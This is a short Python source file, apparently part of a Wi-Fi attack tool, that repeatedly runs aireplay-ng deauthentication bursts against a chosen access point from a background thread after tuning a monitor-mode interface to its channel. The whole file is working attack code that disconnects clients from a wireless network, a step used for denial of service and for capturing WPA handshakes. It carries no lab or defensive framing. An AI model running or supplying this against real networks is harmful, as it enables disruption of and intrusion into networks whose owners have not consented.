import subprocess
import threading

from rich import print as rprint


def run_deauth(monitor_iface, bssid, channel, count=10, stop_event=None):
    """
    Run aireplay-ng deauth bursts in a loop until stop_event is set.
    Intended to run in a background thread.
    """
    rprint(f"[cyan][*] Starting deauth bursts against {bssid} (channel {channel})[/cyan]")

    # Set channel first
    try:
        subprocess.run(
            ["iwconfig", monitor_iface, "channel", str(channel)],
            capture_output=True, timeout=5
        )
    except Exception:
        pass

    while stop_event is None or not stop_event.is_set():
        rprint(f"[cyan][*] Sending deauth burst ({count} packets) → {bssid}[/cyan]")
        try:
            result = subprocess.run(
                ["aireplay-ng", "--deauth", str(count), "-a", bssid, monitor_iface],
                capture_output=True, text=True, timeout=30
            )
            if result.returncode != 0 and result.stderr:
                rprint(f"[yellow][-] aireplay-ng: {result.stderr.strip()[:120]}[/yellow]")
        except subprocess.TimeoutExpired:
            rprint("[yellow][-] Deauth burst timed out.[/yellow]")
        except Exception as e:
            rprint(f"[yellow][-] Deauth error: {e}[/yellow]")
            break

        if stop_event and stop_event.wait(timeout=5):
            break

    rprint(f"[cyan][*] Deauth stopped for {bssid}[/cyan]")


def start_deauth_thread(monitor_iface, bssid, channel, count=10):
    """Launch deauth in a daemon thread. Returns (thread, stop_event)."""
    stop_event = threading.Event()
    t = threading.Thread(
        target=run_deauth,
        args=(monitor_iface, bssid, channel, count, stop_event),
        daemon=True,
    )
    t.start()
    return t, stop_event
